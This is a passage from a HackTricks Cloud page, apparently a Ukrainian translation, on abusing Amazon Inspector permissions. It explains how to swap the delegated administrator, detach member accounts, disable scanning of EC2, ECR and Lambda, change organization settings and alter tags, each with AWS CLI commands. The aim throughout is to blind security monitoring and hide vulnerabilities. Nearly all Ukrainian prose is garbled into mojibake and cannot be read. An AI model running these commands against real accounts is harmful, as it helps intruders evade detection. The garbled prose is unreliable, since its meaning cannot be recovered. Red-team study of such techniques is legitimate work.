* –í–∏–º–∫–Ω—É–≤—à–∏ –¥–µ–ª–µ–≥–æ–≤–∞–Ω–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –∑–∞–≤–∞–¥–∏—Ç–∏ –∫–æ–º–∞–Ω–¥—ñ –±–µ–∑–ø–µ–∫–∏ –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å —Ç–∞ –∑–≤—ñ—Ç—ñ–≤ Amazon Inspector.
* –£–≤—ñ–º–∫–Ω–µ–Ω–Ω—è –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –¥–æ–∑–≤–æ–ª–∏—Ç—å –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –±–µ–∑–ø–µ–∫–∏, –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –≤–∏–º–∏–∫–∞—é—á–∏ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –∞–±–æ –∑–º—ñ–Ω—é—é—á–∏ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –¥–ª—è –ø—Ä–∏—Ö–æ–≤—É–≤–∞–Ω–Ω—è —à–∫—ñ–¥–ª–∏–≤–æ—ó –¥—ñ—è–ª—å–Ω–æ—Å—Ç—ñ.

{% hint style="warning" %}
–ù–µ–æ–±—Ö—ñ–¥–Ω–æ, —â–æ–± –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –±—É–≤ –≤ —Ç—ñ–π –∂–µ –û—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó, —â–æ –π –∂–µ—Ä—Ç–≤–∞, —â–æ–± —Å—Ç–∞—Ç–∏ –¥–µ–ª–µ–≥–æ–≤–∞–Ω–∏–º –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º.

–î–ª—è —Ç–æ–≥–æ, —â–æ–± –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å—Ç–∞–≤ –¥–µ–ª–µ–≥–æ–≤–∞–Ω–∏–º –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º, —Ç–∞–∫–æ–∂ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ, —â–æ–± –ø—ñ—Å–ª—è –≤–∏–º–∫–Ω–µ–Ω–Ω—è –ª–µ–≥—ñ—Ç–∏–º–Ω–æ–≥–æ –¥–µ–ª–µ–≥–æ–≤–∞–Ω–æ–≥–æ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞, —ñ –ø–µ—Ä–µ–¥ —É–≤—ñ–º–∫–Ω–µ–Ω–Ω—è–º –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —è–∫ –¥–µ–ª–µ–≥–æ–≤–∞–Ω–æ–≥–æ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞, –ª–µ–≥—ñ—Ç–∏–º–Ω–∏–π –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –≤–∏–∫–ª—é—á–µ–Ω–∏–π –∑ –¥–µ–ª–µ–≥–æ–≤–∞–Ω–∏—Ö –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä—ñ–≤ –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó. –¶–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ—ó –∫–æ–º–∞–Ω–¥–∏ (**`organizations:DeregisterDelegatedAdministrator`** –ø–æ—Ç—Ä—ñ–±–µ–Ω –¥–æ–∑–≤—ñ–ª): **`aws organizations deregister-delegated-administrator --account-id <legit-account-id> --service-principal [inspector2.amazonaws.com](http://inspector2.amazonaws.com/)`**
{% endhint %}
```bash
# Disable
aws inspector2 disable-delegated-admin-account --delegated-admin-account-id <value>
# Enable
aws inspector2 enable-delegated-admin-account --delegated-admin-account-id <value>
```
* **–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤**: –ü–æ—Ä—É—à–µ–Ω–Ω—è —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –±–µ–∑–ø–µ–∫–æ—é.

#### `inspector2:AssociateMember`, `inspector2:DisassociateMember`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ –∞—Å–æ—Ü—ñ–∞—Ü—ñ—î—é –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ —É—á–∞—Å–Ω–∏–∫—ñ–≤ –≤ –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó Amazon Inspector. –ê—Å—É—é—á–∏ –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ –∞–±–æ –≤—ñ–¥'—î–¥–Ω—É—é—á–∏ –ª–µ–≥—ñ—Ç–∏–º–Ω—ñ, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏, —è–∫—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ –≤–∫–ª—é—á–µ–Ω—ñ –≤ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –±–µ–∑–ø–µ–∫–∏ —Ç–∞ –∑–≤—ñ—Ç–Ω—ñ—Å—Ç—å. –¶–µ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –≤–∏–∫–ª—é—á–µ–Ω–Ω—è –∫—Ä–∏—Ç–∏—á–Ω–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ –∑ –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É –±–µ–∑–ø–µ–∫–∏, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤ —Ü–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å–∞—Ö –±–µ–∑ –≤–∏—è–≤–ª–µ–Ω–Ω—è.

{% hint style="warning" %}
–¶—é –¥—ñ—é –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –¥–µ–ª–µ–≥–æ–≤–∞–Ω–∏–º –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º.
{% endhint %}
```bash
# Associate
aws inspector2 associate-member --account-id <value>
# Disassociate
aws inspector2 disassociate-member --account-id <value>
```
* **–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤**: –í–∏–∫–ª—é—á–µ–Ω–Ω—è –∫–ª—é—á–æ–≤–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ –∑ –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫ –±–µ–∑–ø–µ–∫–∏, —â–æ –¥–æ–∑–≤–æ–ª—è—î –Ω–µ–ø–æ–º—ñ—á–µ–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π.

#### `inspector2:Disable`, (`inspector2:Enable` & `iam:CreateServiceLinkedRole`)

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ –¥–æ–∑–≤–æ–ª–æ–º `inspector2:Disable` –∑–º–æ–∂–µ –≤–∏–º–∫–Ω—É—Ç–∏ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –±–µ–∑–ø–µ–∫–∏ –¥–ª—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö —Ç–∏–ø—ñ–≤ —Ä–µ—Å—É—Ä—Å—ñ–≤ (EC2, ECR, Lambda, –∫–æ–¥ Lambda) –¥–ª—è –∑–∞–∑–Ω–∞—á–µ–Ω–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤, –∑–∞–ª–∏—à–∞—é—á–∏ —á–∞—Å—Ç–∏–Ω–∏ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ AWS –±–µ–∑ –Ω–∞–≥–ª—è–¥—É —Ç–∞ –≤—Ä–∞–∑–ª–∏–≤–∏–º–∏ –¥–æ –∞—Ç–∞–∫. –ö—Ä—ñ–º —Ç–æ–≥–æ, –º–∞—é—á–∏ –¥–æ–∑–≤–æ–ª–∏ **`inspector2:Enable`** —Ç–∞ **`iam:CreateServiceLinkedRole`**, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º–æ–∂–µ –ø–æ–≤—Ç–æ—Ä–Ω–æ –≤–≤—ñ–º–∫–Ω—É—Ç–∏ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –≤–∏–±—ñ—Ä–∫–æ–≤–æ, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ –≤–∏—è–≤–ª–µ–Ω–Ω—è –ø—ñ–¥–æ–∑—Ä—ñ–ª–∏—Ö –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π.

{% hint style="warning" %}
–¶—é –¥—ñ—é –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–µ–ª–µ–≥–æ–≤–∞–Ω–∏–º –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º.
{% endhint %}
```bash
# Disable
aws inspector2 disable --account-ids <value> [--resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}>]
# Enable
aws inspector2 enable --resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}> [--account-ids <value>]
```
* **–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤**: –°—Ç–≤–æ—Ä–µ–Ω–Ω—è —Å–ª—ñ–ø–∏—Ö –∑–æ–Ω —É –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É –±–µ–∑–ø–µ–∫–∏.

#### `inspector2:UpdateOrganizationConfiguration`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ —Ü–∏–º –¥–æ–∑–≤–æ–ª–æ–º –∑–º–æ–∂–µ –æ–Ω–æ–≤–∏—Ç–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –¥–ª—è –≤–∞—à–æ—ó –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó Amazon Inspector, —â–æ –≤–ø–ª–∏–Ω–µ –Ω–∞ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è, —É–≤—ñ–º–∫–Ω–µ–Ω—ñ –¥–ª—è –Ω–æ–≤–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ —É—á–∞—Å–Ω–∏–∫—ñ–≤.

{% hint style="warning" %}
–¶—é –¥—ñ—é –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–µ–ª–µ–≥–æ–≤–∞–Ω–∏–º –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º.
{% endhint %}
```bash
aws inspector2 update-organization-configuration --auto-enable <ec2=true|false,ecr=true|false,lambda=true|false,lambdaCode=true|false>
```
* **–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤**: –ó–º—ñ–Ω–∏—Ç–∏ –ø–æ–ª—ñ—Ç–∏–∫–∏ —Ç–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –±–µ–∑–ø–µ–∫–∏ –¥–ª—è –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó.

#### `inspector2:TagResource`, `inspector2:UntagResource`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ —Ç–µ–≥–∞–º–∏ –Ω–∞ —Ä–µ—Å—É—Ä—Å–∞—Ö AWS Inspector, —è–∫—ñ —î –∫—Ä–∏—Ç–∏—á–Ω–æ –≤–∞–∂–ª–∏–≤–∏–º–∏ –¥–ª—è –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó, –≤—ñ–¥—Å—Ç–µ–∂–µ–Ω–Ω—è —Ç–∞ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó –æ—Ü—ñ–Ω–æ–∫ –±–µ–∑–ø–µ–∫–∏. –ó–º—ñ–Ω—é—é—á–∏ –∞–±–æ –≤–∏–¥–∞–ª—è—é—á–∏ —Ç–µ–≥–∏, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –ø—Ä–∏—Ö–æ–≤–∞—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤—ñ–¥ —Å–∫–∞–Ω—É–≤–∞–Ω—å –±–µ–∑–ø–µ–∫–∏, –ø–æ—Ä—É—à–∏—Ç–∏ –∑–≤—ñ—Ç–Ω—ñ—Å—Ç—å –ø—Ä–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω—ñ—Å—Ç—å —ñ –∑–∞–≤–∞–∂–∞—Ç–∏ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω–∏–º –ø—Ä–æ—Ü–µ—Å–∞–º —É—Å—É–Ω–µ–Ω–Ω—è, —â–æ –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ –Ω–µ–∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏—Ö –ø—Ä–æ–±–ª–µ–º –∑ –±–µ–∑–ø–µ–∫–æ—é —Ç–∞ –ø–æ—Ä—É—à–µ–Ω–Ω—è —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ —Å–∏—Å—Ç–µ–º–∏.
```bash
aws inspector2 tag-resource --resource-arn <value> --tags <value>
aws inspector2 untag-resource --resource-arn <value> --tag-keys <value>
```
* **Potential Impact**: –ü—Ä–∏—Ö–æ–≤—É–≤–∞–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π, –ø–æ—Ä—É—à–µ–Ω–Ω—è –∑–≤—ñ—Ç–Ω–æ—Å—Ç—ñ –ø—Ä–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω—ñ—Å—Ç—å, –ø–æ—Ä—É—à–µ–Ω–Ω—è –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó –±–µ–∑–ø–µ–∫–∏ —Ç–∞ –ø–æ—Ä—É—à–µ–Ω–Ω—è —Ä–æ–∑–ø–æ–¥—ñ–ª—É –≤–∏—Ç—Ä–∞—Ç.

## References

* [https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html)
* [https://docs.aws.amazon.com/service-authorization/latest/reference/list\_amazoninspector2.html](https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
